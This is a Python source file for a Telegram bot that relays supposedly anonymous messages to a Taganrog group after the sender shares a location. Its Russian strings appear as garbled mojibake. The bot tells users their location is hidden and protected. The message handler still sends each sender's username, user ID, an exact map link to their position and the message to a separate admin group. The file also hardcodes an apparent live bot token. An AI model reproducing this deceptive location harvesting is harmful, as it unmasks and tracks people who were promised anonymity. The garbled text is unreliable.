import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from math import radians, sin, cos, sqrt, atan2

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://youtu.be/hK_cbdVPK-E"

# –ì–µ–æ–ø–∞—Ä–∞–º–µ—Ç—Ä—ã –¢–∞–≥–∞–Ω—Ä–æ–≥–∞
TAGANROG_CENTER = (47.2364, 38.8953)
ALLOWED_RADIUS_KM = 50

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ
geo_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("üìç –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

def calculate_distance(lat1, lon1, lat2, lon2):
    """–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π —Ä–∞—Å—á–µ—Ç —Ä–∞—Å—Å—Ç–æ—è–Ω–∏—è –º–µ–∂–¥—É —Ç–æ—á–∫–∞–º–∏"""
    try:
        R = 6371.0
        lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
        dlon = lon2 - lon1
        dlat = lat2 - lat1
        a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
        return R * (2 * atan2(sqrt(a), sqrt(1-a)))
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Ä–∞—Å—á–µ—Ç–∞ —Ä–∞—Å—Å—Ç–æ—è–Ω–∏—è: {e}")
        return float('inf')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –≤–∏–¥–µ–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π"""
    try:
        await update.message.reply_text(
            "–ü—Ä–∏–≤–µ—Ç! –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —Å–Ω–∞—á–∞–ª–∞ –ø–æ–¥–µ–ª–∏—Å—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–µ–π:\n\n"
            "üîí –ù–∏–∫—Ç–æ –Ω–µ —É–≤–∏–¥–∏—Ç —Ç–≤–æ—é –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é (–∞–Ω—Ç–∏—Å–ø–∞–º)\n"
            f"üìπ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è: {VIDEO_LINK}",
            reply_markup=geo_keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ start: {e}")

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ù–∞–¥–µ–∂–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏"""
    try:
        if not update.message or not update.message.location:
            raise ValueError("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–ª—É—á–µ–Ω–∞")

        location = update.message.location
        
        # –í–∞–ª–∏–¥–∞—Ü–∏—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç
        if not (-90 <= location.latitude <= 90) or not (-180 <= location.longitude <= 180):
            raise ValueError("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã")

        distance = calculate_distance(
            TAGANROG_CENTER[0], TAGANROG_CENTER[1],
            location.latitude, location.longitude
        )

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–µ
        context.user_data['verified_geo'] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'distance': distance,
            'valid': distance <= ALLOWED_RADIUS_KM,
            'user_id': update.message.from_user.id
        }

        await update.message.reply_text(
            f"‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø—Ä–∏–Ω—è—Ç–∞ ({distance:.1f} –∫–º –æ—Ç —Ü–µ–Ω—Ç—Ä–∞)\n"
            "–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:",
            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
        )

    except ValueError as ve:
        logger.warning(f"–û—à–∏–±–∫–∞ –≥–µ–æ–¥–∞–Ω–Ω—ã—Ö: {ve}")
        await update.message.reply_text(
            "‚ùå –û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏\n"
            "–ü–æ–ø—Ä–æ–±—É–π –µ—â–µ —Ä–∞–∑:",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≥–µ–æ: {e}")
        await update.message.reply_text(
            "‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–∏—Å—Ç–µ–º—ã. –ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –∂–µ—Å—Ç–∫–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π –≥–µ–æ"""
    try:
        if update.message.chat.type != "private":
            return

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        if 'verified_geo' not in context.user_data:
            await update.message.reply_text(
                "‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:\n"
                "üîí –¢–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã",
                reply_markup=geo_keyboard
            )
            return

        geo_data = context.user_data['verified_geo']
        user = update.message.from_user

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤
        admin_msg = (
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{user.username or 'N/A'} (ID: {user.id})\n"
            f"üìç –ì–µ–æ: https://maps.google.com/?q={geo_data['lat']},{geo_data['lon']}\n"
            f"üìè –†–∞—Å—Å—Ç–æ—è–Ω–∏–µ: {geo_data['distance']:.1f} –∫–º\n\n"
            f"üìù –°–æ–æ–±—â–µ–Ω–∏–µ:\n{update.message.text}"
        )

        # –í—Å–µ–≥–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω–∞–º
        await context.bot.send_message(FORWARD_GROUP_ID, admin_msg)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –∞–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –≤ —Ä–∞–¥–∏—É—Å–µ
        if geo_data['valid']:
            await context.bot.send_message(
                ANON_GROUP_ID,
                f"‚úâÔ∏è –ê–Ω–æ–Ω–∏–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:\n\n{update.message.text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("üîç –û—Ç–∫—Ä—ã—Ç—å", url=ANON_GROUP_LINK)]])
            )
            response = "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–¥–º–∏–Ω–∞–º! (@kmpr0 –µ—Å–ª–∏ —á—Ç–æ)"
        else:
            response = "‚ùå –¢—ã –≤–Ω–µ –∑–æ–Ω—ã –¢–∞–≥–∞–Ω—Ä–æ–≥–∞"

        await update.message.reply_text(response)
        
        # –û—á–∏—â–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
        del context.user_data['verified_geo']
        await update.message.reply_text(
            "–î–ª—è –Ω–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é —Å–Ω–æ–≤–∞:",
            reply_markup=geo_keyboard
        )

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏: {e}")
        await update.message.reply_text(
            "‚ö†Ô∏è –û—à–∏–±–∫–∞. –°–æ–æ–±—â–µ–Ω–∏–µ –ù–ï –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ.\n"
            "–ù–∞—á–Ω–∏ –∑–∞–Ω–æ–≤–æ.",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –æ—à–∏–±–æ–∫"""
    logger.error(f"–°–∏—Å—Ç–µ–º–Ω–∞—è –æ—à–∏–±–∫–∞: {context.error}", exc_info=True)
    if update and isinstance(update, Update) and update.message:
        await update.message.reply_text(
            "‚ö†Ô∏è –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ.",
            reply_markup=geo_keyboard
        )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    logger.info("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –≥–µ–æ")
    app.run_polling()
